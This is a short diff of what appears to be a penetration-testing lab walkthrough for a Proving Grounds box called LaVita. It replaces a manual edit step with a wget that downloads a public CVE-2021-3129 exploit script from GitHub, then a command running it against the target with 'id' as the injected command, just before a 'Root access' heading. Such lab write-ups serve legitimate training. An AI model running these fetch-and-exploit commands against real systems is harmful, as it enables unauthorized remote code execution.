@@ -75,8 +75,9 @@ python exploit.py http://lavita
 We need to edit `exploit.py`, near the bottom. Let's do that. Actually, I will make a parameterized version.
 
 ```sh
-nano exploit.py
-# (make edits for hostname and command...)
+wget https://raw.githubusercontent.com/meltingscales/oscp/refs/heads/main/boxes/provinggrounds/LaVita/CVE-2021-3129.py
+
+python CVE-2021-3129.py http://lavita id
 ```
 ## Root access
 
